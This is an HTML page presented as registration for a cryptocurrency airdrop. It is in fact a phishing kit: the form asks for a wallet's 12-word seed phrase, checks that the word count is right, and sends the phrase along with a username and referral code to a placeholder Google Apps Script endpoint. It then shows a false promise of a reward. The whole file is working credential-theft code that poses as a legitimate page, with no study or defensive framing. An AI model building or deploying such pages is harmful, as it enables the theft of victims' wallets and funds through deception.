<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Register for the Airdrop</title>
  <style>
    body {
      background: #121212;
      color: #ffffff;
      font-family: Arial, sans-serif;
      padding: 40px;
    }
    h1 {
      color: #00ffcc;
    }
    input[type="text"], input[type="password"] {
      width: 300px;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
    }
    input[type="submit"] {
      background: #00ffcc;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    .wallet-input {
      position: relative;
    }
    .toggle-eye {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .success-message {
      margin-top: 20px;
      color: #00ffcc;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>Register for the Airdrop</h1>

  <form onsubmit="submitForm(event)">
    <input type="text" id="username" placeholder="Username" required><br>

    <div class="wallet-input">
      <input type="password" id="wallet" placeholder="Wallet ID (12 words)" required>
      <span class="toggle-eye" onclick="toggleWallet()">üëÅÔ∏è</span>
    </div>

    <input type="text" id="referral" placeholder="Referral Code"><br>

    <input type="submit" value="Submit">
  </form>

  <div class="success-message" id="successMsg"></div>

  <script>
    function toggleWallet() {
      const walletField = document.getElementById("wallet");
      walletField.type = walletField.type === "password" ? "text" : "password";
    }

    function submitForm(e) {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const wallet = document.getElementById("wallet").value.trim();
      const referral = document.getElementById("referral").value.trim();
      const successMsg = document.getElementById("successMsg");

      const words = wallet.split(/\s+/);
      if (words.length !== 12) {
        alert("Wallet ID must contain exactly 12 words.");
        return;
      }

      // Replace with your deployed Google Apps Script URL
      const endpoint = "YOUR_GOOGLE_SCRIPT_WEB_APP_URL";

      fetch(endpoint, {
        method: "POST",
        body: JSON.stringify({ username, wallet, referral }),
        headers: { "Content-Type": "application/json" }
      })
      .then(res => res.json())
      .then(data => {
        successMsg.innerText = "Thank you for registering! You'll receive your reward shortly.";
      })
      .catch(err => {
        alert("Something went wrong. Please try again.");
        console.error(err);
      });
    }
  </script>

</body>
</html>
